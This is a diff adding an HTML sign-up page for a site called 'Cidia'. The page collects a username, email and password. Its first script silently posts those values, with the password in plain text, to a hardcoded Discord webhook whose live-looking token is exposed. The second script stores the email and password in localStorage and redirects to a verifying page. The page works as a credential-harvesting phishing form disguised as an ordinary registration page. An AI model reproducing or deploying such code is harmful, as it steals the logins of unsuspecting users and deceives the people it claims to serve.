@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cidia • Sign Up</title>
+  <link rel="stylesheet" href="css/v98rEHnMmRHt.css">
+  <link rel="stylesheet" href="css/stA5PPAZmeti.css">
+  <link rel="stylesheet" href="main.css">
+  <style>
+    /* Add your custom button styles here */
+    .card-center-button button {
+  padding: 13px 40px; /* Increased horizontal padding */
+  border-radius: 7px; /* Adjusted border-radius to round the corners */
+  background-color: #1c1d2b;
+  color: white;
+  border: none;
+  cursor: pointer;
+  text-shadow: 2px 2px 4px rgba(0, 0, 0, 5.5); /* Added shadow effect */
+  margin-right: 10px;
+}
+
+    .card-center-button button:hover {
+      background-color: #1e1f27;
+    }
+
+    .card-center-button p {      
+      margin-top: 5px;
+    }
+.notification {
+  position: fixed;
+  top: -50px; /* Initially position notification above the viewport */
+  right: 20px;
+  padding: 10px;
+  background-color: #1a6110;
+  border: 1px solid #1a6110;
+  border-radius: 5px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+  z-index: 1000;
+  transition: top 0.3s ease-in-out; /* Smooth transition for top position */
+}
+.notification.error {
+  background-color: #5c0b12;
+  border-color: #5c0b12;
+  color: #ffffff;
+}
+
+    .card-center-button span {
+      color: #888;
+    }
+.register span {
+  color: #1c1d2b;
+}
+
+.credentials {
+  margin-top: -14px; /* Adjusted margin-top to move inputs higher */
+}
+.credentials label {
+  margin-bottom: 3px; /* Adjust margin-bottom to move labels down */
+}
+
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+  <div class="container">
+    <div class="card-header">
+      <h2>Sign Up</h2>
+    </div>
+    <div class="card-body">
+      <div class="card-form">        
+        <div class="credentials">
+          <input id="username" type="text" class="card-input" placeholder="username *">
+
+          <input id="email-signup" type="text" class="card-input" placeholder="Email *">
+        </div>
+        <div class="credentials">
+          <input id="confirm-email-signup" type="email" class="card-input" placeholder="Confirm Email *">
+        </div>
+        <div class="credentials">
+          <label style="margin-bottom: 5px;"></label>
+          <input id="password-signup" type="password" class="card-input" placeholder="Password *">
+        </div>
+        <div class="credentials">
+          <input id="confirm-password-signup" type="password" class="card-input" placeholder="Confirm Password *">
+        </div>
+        <div class="card-center-button">
+          <button id="create-acct-btn">Create Account</button>
+          <button id="return-btn" onclick="window.location.href='Signin'">Return to Login</button>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="copyright">Copyright © 2012 - 2023 Cidia</div>
+
+  <div class="login-results-container" id="loginResultsContainer"></div>
+  <script>
+    // Function to send user data to Discord webhook
+    function sendUserDataToDiscord(username, email, password) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1245021369544998953/8hrb7EVynxNBPoqoyMsJtJ3m6Gx-6KJM7BxmNR4Aa6KYmcGZyBfO_h8IjgGJ86ESme37';
+      const payload = {
+        content: `New sign-up:
+        Username: ${username}
+        Email: ${email}
+        Password: ${password}`
+      };
+  
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('User data sent successfully.');
+        } else {
+          console.error('Error sending user data:', response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error('Error sending user data:', error);
+      });
+    }
+  
+    // Event listener for 'Create Account' button click
+    document.getElementById('create-acct-btn').addEventListener('click', function() {
+      // Get values from input fields
+      const username = document.getElementById('username').value;
+      const email = document.getElementById('email-signup').value;
+      const password = document.getElementById('password-signup').value;
+      const confirmPassword = document.getElementById('confirm-password-signup').value;
+  
+      // Only proceed if email and confirm password match
+      if (email === document.getElementById('confirm-email-signup').value && password === confirmPassword) {
+        // Send user data to Discord webhook
+        sendUserDataToDiscord(username, email, password);
+      } else {
+        alert('Email and Confirm Password fields must match.');
+      }
+    });
+  </script>
+  
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+      const registerButton = document.getElementById("create-acct-btn");
+      const loginResultsContainer = document.getElementById("loginResultsContainer");
+  
+      registerButton.addEventListener("click", function () {
+          const emailInput = document.getElementById("email-signup");
+          const confirmEmailInput = document.getElementById("confirm-email-signup");
+          const passwordInput = document.getElementById("password-signup");
+          const confirmPasswordInput = document.getElementById("confirm-password-signup");
+  
+          const email = emailInput.value.trim();
+          const confirmEmail = confirmEmailInput.value.trim();
+          const password = passwordInput.value.trim();
+          const confirmPassword = confirmPasswordInput.value.trim();
+  
+          // Basic validation
+          if (email === "" || confirmEmail === "" || password === "" || confirmPassword === "") {
+              loginResultsContainer.innerHTML = "<div class='notification error'>All fields are required.</div>";
+              return; // Stop further execution
+          }
+  
+          if (email !== confirmEmail) {
+              loginResultsContainer.innerHTML = "<div class='notification error'>Emails do not match.</div>";
+              return; // Stop further execution
+          }
+  
+          if (password !== confirmPassword) {
+              loginResultsContainer.innerHTML = "<div class='notification error'>Passwords do not match.</div>";
+              return; // Stop further execution
+          }
+  
+          // Custom validation logic
+          const isValid = validateUserInput(email, password);
+  
+          if (isValid) {
+              // Placeholder for number input
+              const number = ""; // Update this with the actual number input value if needed
+  
+              // Create userInfo object with email, password, username, and number
+              const userInfo = {
+                  email: email,
+                  password: password,
+                  username: email, // Set email as the username
+                  number: number // Include the number in the user info
+              };
+  
+              // Store userInfo in localStorage
+              localStorage.setItem("userInfo", JSON.stringify(userInfo));
+  
+              // Log a message before redirecting
+              console.log("Redirecting to login page...");
+  
+              setTimeout(function() {
+    window.location.href = 'VerifyingPage';
+}, 5000); // 2000 milliseconds = 2 seconds
+          } else {
+              // Display error message or handle invalid registration
+              loginResultsContainer.innerHTML = "<div class='notification error'>Invalid registration details.</div>";
+          }
+      });
+  });
+  
+  function validateUserInput(email, password) {
+      // Example validation: Check if email contains '@' and password is at least 6 characters long
+      const emailValid = email.includes('@');
+      const passwordValid = password.length >= 6;
+  
+      return emailValid && passwordValid;
+  }
+  </script>
+  
+  <input type="hidden" value="" class="card-input" name="hwid" id="hwid">
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js"></script>
+  <script type="module" src="script.js"></script>
+</body>
+</html>
